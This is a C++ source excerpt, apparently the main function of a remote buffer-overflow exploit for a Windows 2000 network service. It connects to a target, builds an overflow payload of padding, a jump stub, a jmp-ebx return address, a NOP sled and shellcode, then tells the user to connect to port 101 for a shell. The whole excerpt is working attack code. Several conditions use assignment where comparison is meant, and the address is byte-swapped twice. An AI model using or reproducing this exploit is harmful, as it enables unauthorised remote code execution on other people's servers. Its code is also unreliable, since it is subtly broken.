int main(int argc,char *argv[])
{
 ver();
 if ((argc<2)||(argc>3)){usage(argv[0]);return -1;}
 if (WSAStartup(MAKEWORD(2,0),&wsadata)!=0){cout<<"[+] wsastartup error: "<<WSAGetLastError()<<endl;return -1;}
 int ip=htonl(inet_addr(argv[1])), sz, port, sizev, sizew, sizex, sizey, sizez, v, w, x, y, z;
 if (argc=3){port=atoi(argv[2]);}
 else port=2000;
 SOCKET s;
 struct fd_set mask;
 struct timeval timeout;
 struct sockaddr_in server;
 s=socket(AF_INET,SOCK_STREAM,0);

 if (s=INVALID_SOCKET){ cout<<"[+] socket() error: "<<WSAGetLastError()<<endl;WSACleanup();return -1;}
 server.sin_family=AF_INET;
 server.sin_addr.s_addr=htonl(ip);
 server.sin_port=htons(port);
 WSAConnect(s,(struct sockaddr *)&server,sizeof(server),NULL,NULL,NULL,NULL);
 timeout.tv_sec=3;timeout.tv_usec=0;FD_ZERO(&mask);FD_SET(s,&mask);
 switch(select(s+1,NULL,&mask,NULL,&timeout))
 {
  case -1: {cout<<"[+] select() error: "<<WSAGetLastError()<<endl;closesocket(s);return -1;}
  case 0: {cout<<"[+] connect() error: "<<WSAGetLastError()<<endl;closesocket(s);return -1;}
  default:
   if(FD_ISSET(s,&mask))
   {
    cout<<"[+] connected, constructing the payload..."<<endl;
    Sleep(1000);
    sizev=5;
    sizew=88;
    sizey=800-sizeof(scode);
    sizex=5;
    sizez=20;
    sz=sizev+sizew+sizex+sizez+sizeof(scode)+sizey;
    memset(payload,0,sizeof(payload));
    strcat(payload,"");
    for (v=0;v<sizev;v++){strcat(payload,"\x61");}
    strcat(payload,"\x66\x8b\xf3");
    strcat(payload,"\x66\x83\xc6\x09");
    strcat(payload,"\xff\xe6");
    for (w=0;w<sizew;w++){strcat(payload,"\x61");}
    strcat(payload,"\xeb");
    strcat(payload,"\x9d\x61\x61");
    strcat(payload,jmpebxw2k);
    for (x=0;x<sizex;x++){strcat(payload,"\x90");}
    strcat(payload,scode);
    for (y=0;y<sizey;y++){strcat(payload,"\x61");}
    for (z=0;z<sizez;z++){strcat(payload,"~");}

    if (send(s,payload,strlen(payload),0)=SOCKET_ERROR) { cout<<"[+] sending error, the server prolly rebooted."<<endl;return -1;}
    cout<<"[+] size of payload: "<<sz<<endl;
    cout<<"[+] payload send, connect the port 101 to get a shell."<<endl;
    return 0;
   }

 }

 closesocket(s);
 WSACleanup();
 return 0;
}